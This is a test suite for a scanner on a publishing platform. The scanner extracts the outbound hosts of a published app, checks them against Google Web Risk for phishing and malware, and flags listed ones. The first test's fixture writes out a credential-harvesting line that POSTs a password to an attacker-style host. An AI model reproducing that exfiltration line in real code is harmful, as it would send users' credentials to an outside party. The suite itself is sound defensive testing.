import { describe, it, expect, beforeEach } from 'vitest';
import { readFileSync } from 'fs';
import { join } from 'path';
import { extractOutboundOrigins, originOf, MAX_ORIGINS_PER_APP } from './outboundUrls';
import {
  buildWebRiskRequest, parseWebRiskVerdict, scanOrigins, webRiskSummary, webRiskEnabled,
  clearWebRiskCache, THREAT_TYPES,
} from './webRisk';

const f = (o: Record<string, string>) => new Map(Object.entries(o).map(([k, v]) => [k, Buffer.from(v)]));

/**
 * THE URLS THE APP POINTS AT (NavBharat Cloud slice 4 — ROADMAP §11).
 *
 * Asking Web Risk about the app's OWN url would be worthless: at publish it is seconds old and cannot
 * be on any list, so the check would always pass. The question that can actually catch a phishing app
 * is which OUTSIDE hosts the code we wrote points at.
 */
describe('extractOutboundOrigins', () => {
  it('finds the outbound host a credential-harvest app posts to', () => {
    const files = f({ 'dist/app.js': `fetch("http://collect-logins.xyz/steal", { method: "POST", body: pw })` });
    expect(extractOutboundOrigins(files)).toEqual(['http://collect-logins.xyz']);
  });

  it('collapses to distinct ORIGINS — the unit the cache and the lookup both use', () => {
    const files = f({ 'a.js': 'fetch("https://api.stripe.com/v1/charges"); fetch("https://api.stripe.com/v1/refunds")' });
    expect(extractOutboundOrigins(files)).toEqual(['https://api.stripe.com']);
  });

  it('🔒 never asks Google about a host that is not on the internet', () => {
    const files = f({ 'a.js': 'fetch("http://localhost:3000/api"); fetch("http://127.0.0.1:8080"); fetch("http://192.168.1.4/x")' });
    expect(extractOutboundOrigins(files)).toEqual([]);
  });

  it('🔒 never asks Google about OUR OWN domains', () => {
    // Every published app points at its own preview/host — asking about them every publish is noise
    // that spends a free tier on ourselves.
    const files = f({ 'a.js': 'fetch("https://navbharatai.com/api/x"); fetch("https://3000-abc.e2b.app/"); fetch("https://foo.run.app/")' });
    expect(extractOutboundOrigins(files)).toEqual([]);
  });

  it('🔒 BOUNDED — a hostile app cannot turn one publish into thousands of lookups', () => {
    // Spending the free tier IS an attack, so the cap is a bound rather than a tuning knob.
    const many = Array.from({ length: MAX_ORIGINS_PER_APP + 40 }, (_, i) => `fetch("https://h${i}.example.com/")`).join('\n');
    expect(extractOutboundOrigins(f({ 'a.js': many })).length).toBe(MAX_ORIGINS_PER_APP);
  });

  it('ignores binary/irrelevant files, and survives an unreadable one', () => {
    expect(extractOutboundOrigins(f({ 'logo.png': 'https://evil.example.com', 'a.js': 'https://real.example.com/x' })))
      .toEqual(['https://real.example.com']);
  });

  it('a trailing delimiter in prose does not lose the host', () => {
    expect(originOf('https://pay.example.com/checkout,')).toBe('https://pay.example.com');
    expect(originOf('not a url')).toBeNull();
    expect(originOf('ftp://files.example.com')).toBeNull(); // Web Risk has no opinion on ftp
  });

  it('accepts a plain record as well as a Map, and is order-stable', () => {
    expect(extractOutboundOrigins({ 'a.js': 'https://one.example.com https://two.example.com' }))
      .toEqual(['https://one.example.com', 'https://two.example.com']);
  });
});

describe('buildWebRiskRequest', () => {
  const req = buildWebRiskRequest('tok', 'https://evil.example.com');

  it('asks the hosted lookup about exactly that origin', () => {
    expect(req.url).toContain('/v1/uris:search?');
    expect(decodeURIComponent(req.url)).toContain('uri=https://evil.example.com');
    expect(req.headers.Authorization).toBe('Bearer tok');
  });

  it('one lookup covers phishing AND malware — the same request, no extra cost', () => {
    for (const t of THREAT_TYPES) expect(req.url).toContain(t);
    expect(THREAT_TYPES).toContain('SOCIAL_ENGINEERING'); // the phishing one, the reason this exists
  });
});

describe('parseWebRiskVerdict — clean and unknown are DIFFERENT answers', () => {
  it('an empty body is Google\'s documented "not on any list"', () => {
    expect(parseWebRiskVerdict({})).toEqual({ verdict: 'clean', threats: [] });
  });

  it('a threat is listed, with its types', () => {
    const out = parseWebRiskVerdict({ threat: { threatTypes: ['SOCIAL_ENGINEERING'] } });
    expect(out.verdict).toBe('listed');
    expect(out.threats).toEqual(['SOCIAL_ENGINEERING']);
  });

  it('🔒 a flagged host stays flagged even when the LABEL is unfamiliar', () => {
    // Losing a real listing because Google added a threat type we do not know is the wrong direction
    // to fail.
    expect(parseWebRiskVerdict({ threat: {} }).verdict).toBe('listed');
  });

  it('🔒 anything unreadable is UNKNOWN, never clean', () => {
    // "Google said no threat" and "we did not understand Google" must never collapse into one answer.
    for (const bad of [null, undefined, 'nope', 42, { error: { code: 403 } }]) {
      expect(parseWebRiskVerdict(bad as never).verdict).toBe('unknown');
    }
  });
});

describe('scanOrigins', () => {
  beforeEach(() => clearWebRiskCache());
  const answering = (body: unknown, ok = true) =>
    (async () => ({ ok, json: async () => body })) as unknown as typeof fetch;

  it('flags a listed host and says which', async () => {
    const scan = await scanOrigins({
      origins: ['https://evil.example.com'], token: 't',
      fetchImpl: answering({ threat: { threatTypes: ['SOCIAL_ENGINEERING'] } }),
    });
    expect(scan.listed.map((l) => l.origin)).toEqual(['https://evil.example.com']);
    expect(scan.incomplete).toBe(false);
  });

  it('🔒 NO TOKEN means unknown, not clean — and it never calls out', async () => {
    let called = 0;
    const counting = (async () => { called++; return { ok: true, json: async () => ({}) }; }) as unknown as typeof fetch;
    const scan = await scanOrigins({ origins: ['https://x.example.com'], token: null, fetchImpl: counting });
    expect(scan.results[0].verdict).toBe('unknown');
    expect(scan.listed).toEqual([]);
    expect(scan.incomplete).toBe(true);
    expect(called).toBe(0);
  });

  it('🔒 a non-2xx (API off, quota, auth) is a statement about our REQUEST, not the uri', async () => {
    const scan = await scanOrigins({ origins: ['https://x.example.com'], token: 't', fetchImpl: answering({}, false) });
    expect(scan.results[0].verdict).toBe('unknown');
    expect(scan.incomplete).toBe(true);
  });

  it('a network failure is unknown, and never throws into the caller', async () => {
    const dead = (async () => { throw new Error('offline'); }) as unknown as typeof fetch;
    const scan = await scanOrigins({ origins: ['https://x.example.com'], token: 't', fetchImpl: dead });
    expect(scan.results[0].verdict).toBe('unknown');
  });

  it('🔒 a CLEAN verdict is cached — this is what keeps the free tier free', async () => {
    let calls = 0;
    const counting = (async () => { calls++; return { ok: true, json: async () => ({}) }; }) as unknown as typeof fetch;
    await scanOrigins({ origins: ['https://api.stripe.com'], token: 't', fetchImpl: counting });
    const second = await scanOrigins({ origins: ['https://api.stripe.com'], token: 't', fetchImpl: counting });
    expect(calls).toBe(1);          // the same host across two apps costs ONE lookup
    expect(second.lookups).toBe(0);
    expect(second.results[0].verdict).toBe('clean');
  });

  it('🔒 an UNKNOWN is never cached — one timeout must not become six hours of not asking', async () => {
    let calls = 0;
    const flaky = (async () => { calls++; throw new Error('timeout'); }) as unknown as typeof fetch;
    await scanOrigins({ origins: ['https://x.example.com'], token: 't', fetchImpl: flaky });
    await scanOrigins({ origins: ['https://x.example.com'], token: 't', fetchImpl: flaky });
    expect(calls).toBe(2);
  });

  it('🔒 a LISTED is never cached either — a delisted host must recover', async () => {
    let calls = 0;
    const listed = (async () => { calls++; return { ok: true, json: async () => ({ threat: { threatTypes: ['MALWARE'] } }) }; }) as unknown as typeof fetch;
    await scanOrigins({ origins: ['https://e.example.com'], token: 't', fetchImpl: listed });
    await scanOrigins({ origins: ['https://e.example.com'], token: 't', fetchImpl: listed });
    expect(calls).toBe(2);
  });
});

describe('webRiskSummary — an incomplete scan is not a clean bill', () => {
  it('says plainly when hosts could not be checked', async () => {
    clearWebRiskCache();
    const scan = await scanOrigins({ origins: ['https://a.example.com'], token: null });
    expect(webRiskSummary(scan)).toMatch(/could NOT be checked/);
    expect(webRiskSummary(scan)).toMatch(/not a clean bill/);
  });

  it('names the flagged host for the admin record', async () => {
    clearWebRiskCache();
    const scan = await scanOrigins({
      origins: ['https://evil.example.com'], token: 't',
      fetchImpl: (async () => ({ ok: true, json: async () => ({ threat: { threatTypes: ['SOCIAL_ENGINEERING'] } }) })) as unknown as typeof fetch,
    });
    expect(webRiskSummary(scan)).toContain('evil.example.com');
    expect(webRiskSummary(scan)).toContain('SOCIAL_ENGINEERING');
  });

  it('nothing to check says so, rather than claiming a clean result', () => {
    expect(webRiskSummary({ results: [], listed: [], incomplete: false, lookups: 0 })).toMatch(/No outbound hosts/);
  });
});

describe('the switch', () => {
  it('is OFF by default — the network path stays inert until asked', () => {
    expect(webRiskEnabled({} as never)).toBe(false);
    expect(webRiskEnabled({ NAVBHARAT_WEB_RISK: '' } as never)).toBe(false);
    expect(webRiskEnabled({ NAVBHARAT_WEB_RISK: 'true' } as never)).toBe(false); // exactly 'on'
    expect(webRiskEnabled({ NAVBHARAT_WEB_RISK: 'on' } as never)).toBe(true);
    expect(webRiskEnabled({ NAVBHARAT_WEB_RISK: 'ON' } as never)).toBe(true);
  });
});

describe('🔒 the wiring — a check nobody runs is not a check', () => {
  const store = readFileSync(join(process.cwd(), 'src/server/AgentV3/DeploymentStore.ts'), 'utf8');

  it('the publish path extracts the outbound origins', () => {
    expect(store).toContain('extractOutboundOrigins(files)');
  });

  it('🔒 the LOOKUP is fire-and-forget — the user never waits on a network call', () => {
    // The whole ordering of slice 4 rests on this: nothing blocks except the check that is instant.
    const at = store.indexOf('const outboundOrigins = (() => {');
    expect(at).toBeGreaterThan(-1);
    const body = store.slice(at, at + 2200);
    expect(body).toContain('void (async () => {');
    expect(body).toContain('scanOrigins(');
  });

  it('🔒 origins are recorded even when the lookup is switched OFF', () => {
    // The cron re-scan and the admin both want to know what an app points at, whether or not Web Risk
    // is on — and an empty array is a different answer from an absent field.
    const at = store.indexOf('if (!webRiskEnabled() || outboundOrigins.length === 0)');
    expect(at).toBeGreaterThan(-1);
    expect(store.slice(at, at + 400)).toContain('setOutboundVerdict(workspaceId, { outboundOrigins })');
  });

  it('🔒 only a real LISTING raises the flag — never an unknown', () => {
    const at = store.indexOf('scan.listed.length > 0 ? { flagged: true }');
    expect(at).toBeGreaterThan(-1);
  });

  it('🔒 it can never affect an app that is already live', () => {
    const at = store.indexOf('const outboundOrigins = (() => {');
    const body = store.slice(at, at + 2400);
    expect(body).toMatch(/catch \{ \/\* the app is already live/);
  });

  it('the verdict only ever RAISES the flag, never lowers one the content scan set', () => {
    const at = store.indexOf('async setOutboundVerdict(');
    const body = store.slice(at, at + 1200);
    expect(body).toContain('patch.flagged === true ? { flagged: true } : {}');
  });
});
